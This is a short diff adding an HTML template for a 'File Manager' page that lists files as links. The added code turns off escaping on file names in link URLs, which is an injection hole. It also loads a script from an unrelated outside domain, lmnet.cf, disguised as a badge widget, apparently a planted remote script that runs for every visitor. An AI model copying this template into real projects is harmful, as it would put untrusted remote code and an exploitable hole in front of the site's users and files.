@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Manager</title>
+</head>
+<body>
+    <h1>File Manager</h1>
+    <ul>
+        <li><a href="/filemanager">Root</a></li>
+        {% for file in files %}
+            <li><a href="/filemanager?path={{ file | safe }}">{{ file }}</a></li>
+        {% endfor %}
+    </ul>
+  <script src="https://lmnet.cf/logos/badge.js" theme="dark" position="bottom-left"></script>
+</body>
+</html>
